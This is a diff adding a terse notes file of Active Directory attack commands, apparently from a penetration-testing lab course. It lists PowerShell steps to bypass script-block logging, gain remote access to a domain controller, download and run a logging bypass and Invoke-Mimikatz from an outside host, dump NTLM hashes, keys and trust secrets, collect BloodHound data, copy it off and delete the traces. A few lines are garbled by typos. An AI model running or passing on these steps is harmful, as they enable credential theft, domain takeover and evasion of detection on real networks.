@@ -1,0 +1,21 @@
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+. C:\AD\Tools\PowerView.ps1
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess -Verbose
+. C:\AD\Tools\Set-RemotePSRemoting.ps1
+Enter-PSSession -Computer mcorp-dc OR winrs -r:dcorp-dc cmd
+Run whoami & hostname Command to confirm
+whoami /user ( for SID)
+. .\RunWithRegistryNonAdmin.bat ( we copied this files from KRBTGT Golden shell to DC)
+. .\PowerView.ps1
+iex (iwr http://172.16.100.87/sbloggingbypass.txt -UseBasicParsing)
+iex (iwr http://172.16.100.87/Invoke-Mimikatz.ps1 -UseBasicParsing)
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"' ( with this Command you will get Administrator NTML and SID)
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' ( with this Command you will get NTML for All accounts)
+type""klist" 
+. .\SharpHound.ps1 (run bloodhound collector on DC)
+Invoke-BloodHound -CollectionMethod All -Verbose ( run collector)
+copy C:\Users\Public\20220708023249_BloodHound.zip \\dcorp-std687\c$ ( copy the collectoe on your local machine)
+del "20220708023249_BloodHound.zip" ( after Copy delete the bloodhound file)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' ( you an continue in the same shell for cross forest attack)
